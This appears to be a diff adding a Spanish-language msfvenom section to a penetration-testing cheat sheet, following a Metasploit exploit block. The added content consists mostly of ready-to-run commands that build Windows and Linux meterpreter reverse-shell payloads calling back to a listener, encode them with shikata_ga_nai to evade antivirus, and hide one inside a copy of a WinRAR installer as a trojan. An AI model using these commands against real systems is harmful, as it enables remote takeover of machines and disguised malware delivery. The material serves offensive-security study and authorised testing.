@@ -329,3 +329,23 @@ set rhost 192.150.137.3
 set LHOST 192.150.137.2
 exploit
 ```
+
+### MSFVENOM
+Es una herramienta de la suite de Metasploit Framework que se utiliza para generar payloads (cargas útiles) de código malicioso. Estas cargas útiles pueden ser utilizadas en exploits y ataques cibernéticos con fines de pruebas de penetración o seguridad. msfvenom permite personalizar y crear payloads específicos para diferentes escenarios y objetivos, incluyendo la infección de sistemas con malware o la explotación de vulnerabilidades conocidas.
+
+#### Windows
+
+```python
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payloadx86.exe
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > payloadx86.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > encodedx86.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -k -x /Downloads/winrar32.exe > winra.exe
+```
+
+#### Linux
+
+```python
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payloadx86
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payloadx64
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > encodedx86
+```
